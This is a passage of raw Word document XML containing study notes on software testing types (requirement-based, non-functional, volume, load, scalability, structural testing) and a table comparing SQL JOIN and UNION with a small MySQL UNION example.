          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Requirement-based testing: </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>In this type of testing the requirements are prioritized depending on the risk criteria and accordingly the tests are prioritized. This will ensure that the most important and most critical tests are included in the testing effort.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Business-process-based testing: </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>In this type of testing the scenarios involved in the day-to-day business use of the system are described. It uses the knowledge of the business processes.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>For example, a personal and payroll system may have the business process along the lines of: someone joins the company, employee is paid on the regular basis and employee finally leaves the company.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:p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Non-functional testing includes:</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Reliability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Usability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Efficiency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Maintainability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Portability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Baseline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Compliance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Documentation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Endurance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lastRenderedPageBreak/>
        <w:t>Load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Performance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Compatibility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Security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Scalability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Volume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Stress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Recovery testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:num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Internationalization testing and Localization testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009115FC" w:rsidRPr="00584E67" w:rsidRDefault="009115FC" w:rsidP="009115FC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Volume</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> testing checks if the system behaves as expected for certain volume of data. Volume can be increasing size of the file. On the other hand, load tests checks the performance of the system when the load is increased. Load testing here can be increasing the number of files. Volume testing can be used to measure the throughput while load testing can be used for measuring performance.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009115FC" w:rsidRPr="00584E67" w:rsidRDefault="009115FC" w:rsidP="009115FC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Scalability</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be considered as a part of performance testing which checks if the system is scalable or not. To find if the functionality and the performance of a system will scale up to meet specified requirements. Load testing is to check if the system can take load or not. To check the expected usage of a software program by simulating multiple users accessing the program's services concurrently.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Structural Testing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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color w:val="333333"/>
        </w:rPr>
        <w:t>The structural testing is the testing of the structure of the system or component.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Structural testing is often referred to as ‘white box’ or ‘glass box’ or ‘clear-box testing’ because in structural testing we are interested in what is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>happening</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘inside the system/application’.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>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color w:val="333333"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>In structural testing the testers are required to have the knowledge of the internal implementations of the code. Here the testers require knowledge of how the software is implemented, how it works.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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color w:val="333333"/>
        </w:rPr>
        <w:t>During structural testing the tester is concentrating on how the software does it. For example, a structural technique wants to know how loops in the software are working. Different test cases may be derived to exercise the loop once, twice, and many times. This may be done regardless of the functionality of the software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Structural testing can be used at all levels of testing. Developers use structural testing in component testing and component integration testing, especially where there is good tool support for code coverage. Structural testing is also used in system and acceptance testing, but the structures are different. For example, the coverage of menu options or major business transactions could be the structural element in system or acceptance testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRDefault="004E3A7C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00922726" w:rsidRPr="00584E67" w:rsidRDefault="00922726">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFDFA"/>
        <w:spacing w:after="0" w:line="320" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Difference between JOIN and UNION</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFDFA"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4788"/>
        <w:gridCol w:w="4788"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidTr="00ED6D7B">
        <w:trPr>
          <w:trHeight w:val="413"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4788" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FEFDFA"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>                     </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t> Join</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4788" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FEFDFA"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>                    </w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>Union</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidTr="00ED6D7B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4788" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FEFDFA"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:hanging="360"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>1.   Join the columns.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:hanging="360"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>2.   Duplicate are allowed</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:hanging="360"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>3.   Combine the column based on condition.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4788" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="000000"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="000000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FEFDFA"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>1.Merge the row</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>2.Duplicates are not allowed</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00ED6D7B" w:rsidRPr="00584E67" w:rsidRDefault="00ED6D7B" w:rsidP="00ED6D7B">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:t>3. Combine the result of two select statements.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pP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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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SELECT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23</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bah</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UNION</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SELECT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45</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bah</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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>bah</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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proofErr w:type="gramStart"/>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23</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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proofErr w:type="gramStart"/>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45</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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Fonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="393318"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>2</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rows</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in</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set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lit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t>0.00</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="pln"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        </w:rPr>
        <w:t xml:space="preserve"> sec</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NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>similary</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> trivial example of</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
